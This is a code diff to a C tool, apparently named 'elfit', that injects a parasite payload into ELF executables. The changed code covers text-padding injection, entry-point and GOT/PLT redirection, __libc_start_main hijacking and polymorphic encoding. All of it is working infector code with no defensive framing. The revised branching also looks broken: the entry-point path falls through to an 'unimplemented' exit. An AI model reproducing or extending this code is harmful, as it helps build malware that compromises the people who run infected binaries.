@@ -57,13 +57,13 @@ int elfit32(opts_t *opts)
 
     if (opts->entrypoint) 
     {
-        entry_redirect_32(&host, malpoint);
+        //entry_redirect_32(&host, malpoint);
     }
     else if (opts->gottable)
     {
         if (opts->pltsymbol)
         {
-            got_redirect_32(&host, opts->pltsymbol, malpoint);
+            //got_redirect_32(&host, opts->pltsymbol, malpoint);
         }
         else
         {
@@ -101,6 +101,8 @@ int elfit64(opts_t *opts)
     Elfit_t parasite;
     uint64_t malpoint;
     uint64_t patch_pos;
+    uint64_t patch_addr;
+    off_t patch_off;
 
     if (opts->cross_infect)
     {
@@ -124,19 +126,30 @@ int elfit64(opts_t *opts)
     load_host(opts->host, &host);
     load_host(opts->parasite, &parasite);
 
-    if (opts->patch_addr)
+    patch_addr = opts->patch_addr;
+    if (!patch_addr)
     {
-        printf("[+ PATCHING PARASITE]\t\tto jump to %08x\n", opts->patch_addr);
-        if (patch_parasite64(&parasite, patch_pos, opts->patch_addr))
+        if (opts->entrypoint)
         {
-            printf("out-of-bounds patch position supplied\n");
-            return -1;
+            printf("[+ ENTRYPOINT REDIR]\n");
+            patch_off = entry_redirect_64(&host, &patch_addr);
+        }
+        if (opts->gottable)
+        {
+            printf("[+ GOT REDIR]\n");
+            patch_off = got_redirect_64(&host, opts->pltsymbol, &patch_addr);
+        }
+        else
+        {
+            printf("unimplemented redirection method choosen\n");
+            exit(1);
         }
     }
-    else
+
+    printf("[+ PATCHING PARASITE]\t\tto jump to %08x\n", patch_addr);
+    if (patch_parasite64(&parasite, patch_pos, patch_addr))
     {
-        printf("parasite patch virtual address required\n");
-        return -1;
+        printf("out-of-bounds patch position supplied\n");
     }
 
     if (opts->polymorphic_key)
@@ -149,6 +162,7 @@ int elfit64(opts_t *opts)
      * we must make the text segment writable */
     if (opts->textpadding)
     {
+        printf("[+ INJECTING PARASITE TO TEXT]\n");
         malpoint = textpadding_inject_64(&host, &parasite, 
             patch_pos, opts->patch_addr);
         reload_host(opts->host, &host);
@@ -178,10 +192,18 @@ int elfit64(opts_t *opts)
 
     reload_host(opts->host, &host);
 
+    /* this is hacky, but we have to get the patch offset again 
+     * after injection. things may have moved around */
+    if (opts->gottable)
+        patch_off = got_redirect_64(&host, opts->pltsymbol, &patch_addr);
+
+    printf("[+ APPLYING REDIRECTION]\n");
+    commit_redirect_64(&host, patch_off, malpoint);
+    /*
     if (opts->entrypoint) 
     {
-        printf("[+ ENTRY_POINT REDIR]\t\tpatching host's entrypoint to 0x%08x\n", malpoint);
-        entry_redirect_64(&host, malpoint);
+        //printf("[+ ENTRY_POINT REDIR]\t\tpatching host's entrypoint to 0x%08x\n", malpoint);
+        //entry_redirect_64(&host, malpoint);
     }
     else if (opts->gottable)
     {
@@ -214,6 +236,7 @@ int elfit64(opts_t *opts)
     {
         return libc_start_main_hijack_64(&host, malpoint, opts->startmain_mode);
     }
+    */
 
     unload_host(&host);
     return 1;
